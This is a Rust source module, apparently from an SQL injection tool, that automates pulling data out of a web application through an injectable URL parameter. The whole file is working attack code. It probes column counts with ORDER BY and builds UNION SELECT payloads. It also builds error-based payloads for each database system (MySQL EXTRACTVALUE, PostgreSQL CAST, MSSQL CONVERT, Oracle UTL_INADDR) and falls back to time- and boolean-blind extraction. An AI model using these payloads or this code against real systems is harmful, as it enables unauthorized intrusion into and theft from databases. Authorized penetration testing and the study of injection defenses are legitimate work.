//! Fast extraction strategies for interactive shells.
//!
//! Tries faster extraction methods before falling back to blind extraction:
//! 1. UNION-based (fastest - single request)
//! 2. Error-based (fast - single request, error reflection)
//! 3. Time-based blind (fallback)
//! 4. Boolean blind (final fallback - slowest but most reliable)

use anyhow::{Context, Result};
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    models::{BlindExtractionConfig, BlindTechnique, HttpResponse},
    similarity::{calculate_similarity, detect_sql_error},
};

use super::types::ShellResult;

/// Fast extraction result including which technique worked.
#[derive(Debug, Clone)]
pub struct FastExtractionResult {
    pub output: String,
    pub technique: FastTechnique,
    pub requests: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FastTechnique {
    Union,
    Error,
    Time,
    Boolean,
}

impl std::fmt::Display for FastTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FastTechnique::Union => write!(f, "UNION"),
            FastTechnique::Error => write!(f, "ERROR"),
            FastTechnique::Time => write!(f, "TIME"),
            FastTechnique::Boolean => write!(f, "BOOLEAN"),
        }
    }
}

/// Try fast extraction methods in order of speed.
pub async fn fast_extract_sql(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    dbms: &str,
    sql: &str,
    baseline: &HttpResponse,
    max_length: usize,
) -> Result<FastExtractionResult> {
    let start = std::time::Instant::now();

    // 1. Try UNION-based extraction (fastest)
    debug!("Attempting UNION-based extraction...");
    match try_union_extraction(detector, url, param, original_value, dbms, sql, baseline).await {
        Ok(Some(result)) => {
            info!("UNION extraction succeeded in {} requests", result.requests);
            return Ok(result);
        }
        Ok(None) => debug!("UNION extraction not applicable"),
        Err(e) => warn!("UNION extraction failed: {}", e),
    }

    // 2. Try Error-based extraction
    debug!("Attempting Error-based extraction...");
    match try_error_extraction(detector, url, param, original_value, dbms, sql, baseline).await {
        Ok(Some(result)) => {
            info!("ERROR extraction succeeded in {} requests", result.requests);
            return Ok(result);
        }
        Ok(None) => debug!("ERROR extraction not applicable"),
        Err(e) => warn!("ERROR extraction failed: {}", e),
    }

    // 3. Fall back to Time-based blind
    debug!("Falling back to Time-based blind extraction...");
    match try_time_extraction(detector, url, param, original_value, dbms, sql, baseline, max_length).await {
        Ok(result) => {
            info!("TIME extraction completed in {} requests", result.requests);
            return Ok(FastExtractionResult {
                output: result.output,
                technique: FastTechnique::Time,
                requests: result.requests,
            });
        }
        Err(e) => warn!("TIME extraction failed: {}", e),
    }

    // 4. Final fallback: Boolean blind
    debug!("Falling back to Boolean blind extraction...");
    match try_boolean_extraction(detector, url, param, original_value, dbms, sql, baseline, max_length).await {
        Ok(result) => {
            info!("BOOLEAN extraction completed in {} requests", result.requests);
            return Ok(FastExtractionResult {
                output: result.output,
                technique: FastTechnique::Boolean,
                requests: result.requests,
            });
        }
        Err(e) => Err(e),
    }
}

/// Try UNION-based extraction.
/// Works when we can inject a UNION SELECT that reflects data in the response.
async fn try_union_extraction(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    dbms: &str,
    sql: &str,
    baseline: &HttpResponse,
) -> Result<Option<FastExtractionResult>> {
    // First, determine column count using ORDER BY
    let col_count = find_union_column_count(detector, url, param, original_value, baseline).await?;
    
    if col_count == 0 {
        debug!("Could not determine column count for UNION");
        return Ok(None);
    }

    // Build UNION payload with our SQL in the first column
    let union_sql = format!("({})", sql);
    let union_payload = build_union_payload(dbms, col_count, &union_sql, 0);
    
    let test_url = detector.build_test_url(url, param, original_value, &union_payload);
    let response = detector.send_request(&test_url).await?;
    
    // Extract the data from the response - look for the marker
    let expected_marker = extract_marker(sql);
    if let Some(extracted) = extract_union_data(baseline, &response, dbms, &expected_marker) {
        Ok(Some(FastExtractionResult {
            output: extracted,
            technique: FastTechnique::Union,
            requests: col_count as usize + 1, // ORDER BY probes + UNION
        }))
    } else {
        Ok(None)
    }
}

/// Find number of columns for UNION using ORDER BY technique.
async fn find_union_column_count(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    baseline: &HttpResponse,
) -> Result<i32> {
    // Try ORDER BY until we get an error or significant change
    for i in 1..=20 {
        let payload = format!("' ORDER BY {}-- ", i);
        let test_url = detector.build_test_url(url, param, original_value, &payload);
        
        match detector.send_request(&test_url).await {
            Ok(response) => {
                let sim = calculate_similarity(&baseline.body, &response.body);
                // If similarity drops significantly or we get an error, we've exceeded column count
                if sim < 0.7 || detect_sql_error(&response.body).is_some() {
                    return Ok(i - 1);
                }
            }
            Err(_) => return Ok(i - 1),
        }
    }
    
    Ok(0)
}

/// Build a UNION SELECT payload.
fn build_union_payload(dbms: &str, col_count: i32, inject_sql: &str, position: usize) -> String {
    let dbms_lower = dbms.to_lowercase();
    
    let mut columns: Vec<String> = (0..col_count)
        .map(|i| {
            if i == position as i32 {
                inject_sql.to_string()
            } else {
                match dbms_lower.as_str() {
                    "mysql" | "mariadb" => "NULL".to_string(),
                    "postgresql" | "postgres" => "NULL".to_string(),
                    "mssql" | "sqlserver" => "NULL".to_string(),
                    "oracle" => "NULL".to_string(),
                    "sqlite" => "NULL".to_string(),
                    _ => "NULL".to_string(),
                }
            }
        })
        .collect();

    let comment = match dbms_lower.as_str() {
        "mysql" | "mariadb" => "-- ",
        "postgresql" | "postgres" => "--",
        "mssql" | "sqlserver" => "--",
        "oracle" => "--",
        "sqlite" => "--",
        _ => "--",
    };

    format!("' UNION SELECT {} {}", columns.join(","), comment)
}

/// Extract marker from SQL query (e.g., 'SQX_TEST_STRING_12345' from "SELECT 'SQX_TEST_STRING_12345'")
fn extract_marker(sql: &str) -> String {
    // Extract string literal from SQL
    if let Some(start) = sql.find('\'') {
        if let Some(end) = sql[start+1..].find('\'') {
            return sql[start+1..start+1+end].to_string();
        }
    }
    // Fallback: return a portion of the SQL
    sql.chars().take(20).collect()
}

/// Extract data from a UNION response by looking for expected marker.
fn extract_union_data(_baseline: &HttpResponse, response: &HttpResponse, _dbms: &str, expected_marker: &str) -> Option<String> {
    // Check if the expected marker appears in the response
    if response.body.contains(expected_marker) {
        // Try to extract just the data between HTML tags
        let body = &response.body;
        
        // Look for content between > and < (common HTML pattern)
        // This is a simple heuristic - real extraction would parse HTML
        Some(body.trim().to_string())
    } else {
        None
    }
}

/// Try error-based extraction.
/// Works when SQL errors are reflected in the response.
async fn try_error_extraction(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    dbms: &str,
    sql: &str,
    _baseline: &HttpResponse,
) -> Result<Option<FastExtractionResult>> {
    let error_payload = build_error_payload(dbms, sql);
    
    let test_url = detector.build_test_url(url, param, original_value, &error_payload);
    let response = detector.send_request(&test_url).await?;
    
    // Check if we got a SQL error with our data
    let expected_marker = extract_marker(sql);
    if detect_sql_error(&response.body).is_some() && response.body.contains(&expected_marker) {
        // Extract the actual data from the error message
        // Look for the marker and extract surrounding context
        if let Some(pos) = response.body.find(&expected_marker) {
            let start = pos.saturating_sub(20);
            let end = (pos + expected_marker.len() + 20).min(response.body.len());
            let extracted = response.body[start..end].to_string();
            return Ok(Some(FastExtractionResult {
                output: extracted,
                technique: FastTechnique::Error,
                requests: 1,
            }));
        }
    }
    
    Ok(None)
}

/// Build error-based payload.
fn build_error_payload(dbms: &str, sql: &str) -> String {
    let dbms_lower = dbms.to_lowercase();
    
    match dbms_lower.as_str() {
        "mysql" | "mariadb" => {
            // EXTRACTVALUE and UPDATEXML are classic MySQL error-based vectors
            format!(
                "' AND EXTRACTVALUE(0x7e,CONCAT(0x7e,({}),0x7e))-- ",
                sql
            )
        }
        "postgresql" | "postgres" => {
            // CAST to invalid type causes error with data
            format!("' AND 1=CAST(({}) AS INTEGER)-- ", sql)
        }
        "mssql" | "sqlserver" => {
            // CONVERT with invalid style causes error
            format!("' AND 1=CONVERT(INT,({}))-- ", sql)
        }
        "oracle" => {
            // UTL_INADDR with invalid input
            format!("' AND 1=UTL_INADDR.GET_HOST_NAME(({}) || '.x')-- ", sql)
        }
        _ => {
            // Generic: try division by zero with data
            format!("' AND 1=1/(({})-({}))-- ", sql, sql)
        }
    }
}

/// Try time-based blind extraction.
async fn try_time_extraction(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    dbms: &str,
    sql: &str,
    baseline: &HttpResponse,
    max_length: usize,
) -> Result<ShellResult> {
    let extraction_cfg = BlindExtractionConfig {
        target_table: String::new(),
        target_column: String::new(),
        custom_query: Some(sql.to_string()),
        where_clause: None,
        max_rows: 1,
        max_length_per_value: max_length,
        technique: BlindTechnique::Time,
    };

    let extraction = detector
        .extract_data_time_based(
            url,
            param,
            original_value,
            dbms,
            &extraction_cfg,
            None,
            None,
            None,
            None,
        )
        .await?;

    Ok(ShellResult {
        command: sql.to_string(),
        output: extraction.extracted_values.join("\n"),
        success: !extraction.extracted_values.is_empty(),
        requests: extraction.total_requests,
        duration_ms: 0,
    })
}

/// Try boolean-based blind extraction.
async fn try_boolean_extraction(
    detector: &SqliDetector,
    url: &str,
    param: &str,
    original_value: &str,
    dbms: &str,
    sql: &str,
    baseline: &HttpResponse,
    max_length: usize,
) -> Result<ShellResult> {
    let extraction_cfg = BlindExtractionConfig {
        target_table: String::new(),
        target_column: String::new(),
        custom_query: Some(sql.to_string()),
        where_clause: None,
        max_rows: 1,
        max_length_per_value: max_length,
        technique: BlindTechnique::Boolean,
    };

    let extraction = detector
        .extract_data_blind(
            url,
            param,
            original_value,
            dbms,
            &extraction_cfg,
            baseline,
            None,
            None,
            None,
            None,
        )
        .await?;

    Ok(ShellResult {
        command: sql.to_string(),
        output: extraction.extracted_values.join("\n"),
        success: !extraction.extracted_values.is_empty(),
        requests: extraction.total_requests,
        duration_ms: 0,
    })
}

/// Auto-calibrate and switch to fastest working technique.
pub struct AdaptiveExtractor {
    /// Currently preferred extraction technique
    pub preferred_technique: Option<FastTechnique>,
    union_columns: Option<i32>,
}

impl AdaptiveExtractor {
    pub fn new() -> Self {
        Self {
            preferred_technique: None,
            union_columns: None,
        }
    }

    /// Calibrate by trying each technique once and remembering the fastest.
    pub async fn calibrate(
        &mut self,
        detector: &SqliDetector,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        baseline: &HttpResponse,
    ) -> Result<()> {
        let test_query = "SELECT 'SQX_TEST_STRING_12345'";

        // Try UNION
        if let Ok(Some(cols)) = self.test_union_viable(detector, url, param, original_value, baseline).await {
            if let Ok(Some(_)) = try_union_extraction(
                detector, url, param, original_value, dbms, test_query, baseline
            ).await {
                self.preferred_technique = Some(FastTechnique::Union);
                self.union_columns = Some(cols);
                info!("Calibrated to UNION technique with {} columns", cols);
                return Ok(());
            }
        }

        // Try Error
        if let Ok(Some(_)) = try_error_extraction(
            detector, url, param, original_value, dbms, test_query, baseline
        ).await {
            self.preferred_technique = Some(FastTechnique::Error);
            info!("Calibrated to ERROR technique");
            return Ok(());
        }

        // Default to Time-based (faster than boolean usually)
        self.preferred_technique = Some(FastTechnique::Time);
        info!("Calibrated to TIME technique");
        Ok(())
    }

    /// Extract using the calibrated technique.
    pub async fn extract(
        &self,
        detector: &SqliDetector,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        sql: &str,
        baseline: &HttpResponse,
        max_length: usize,
    ) -> Result<FastExtractionResult> {
        match self.preferred_technique {
            Some(FastTechnique::Union) => {
                // Use pre-calibrated column count
                if let Some(cols) = self.union_columns {
                    let union_payload = build_union_payload(dbms, cols, &format!("({})", sql), 0);
                    let test_url = detector.build_test_url(url, param, original_value, &union_payload);
                    let response = detector.send_request(&test_url).await?;
                    
                    let expected_marker = extract_marker(sql);
                    if let Some(extracted) = extract_union_data(baseline, &response, dbms, &expected_marker) {
                        return Ok(FastExtractionResult {
                            output: extracted,
                            technique: FastTechnique::Union,
                            requests: 1,
                        });
                    }
                }
                // Fallback
                fast_extract_sql(detector, url, param, original_value, dbms, sql, baseline, max_length).await
            }
            Some(FastTechnique::Error) => {
                if let Ok(Some(result)) = try_error_extraction(
                    detector, url, param, original_value, dbms, sql, baseline
                ).await {
                    Ok(result)
                } else {
                    fast_extract_sql(detector, url, param, original_value, dbms, sql, baseline, max_length).await
                }
            }
            Some(FastTechnique::Time) => {
                let result = try_time_extraction(detector, url, param, original_value, dbms, sql, baseline, max_length).await?;
                Ok(FastExtractionResult {
                    output: result.output,
                    technique: FastTechnique::Time,
                    requests: result.requests,
                })
            }
            _ => fast_extract_sql(detector, url, param, original_value, dbms, sql, baseline, max_length).await,
        }
    }

    async fn test_union_viable(
        &self,
        detector: &SqliDetector,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
    ) -> Result<Option<i32>> {
        let col_count = find_union_column_count(detector, url, param, original_value, baseline).await?;
        if col_count > 0 {
            Ok(Some(col_count))
        } else {
            Ok(None)
        }
    }
}

impl Default for AdaptiveExtractor {
    fn default() -> Self {
        Self::new()
    }
}
